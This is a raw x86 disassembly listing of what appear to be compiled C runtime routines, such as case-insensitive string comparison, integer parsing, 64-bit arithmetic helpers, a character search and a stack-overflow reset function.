  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
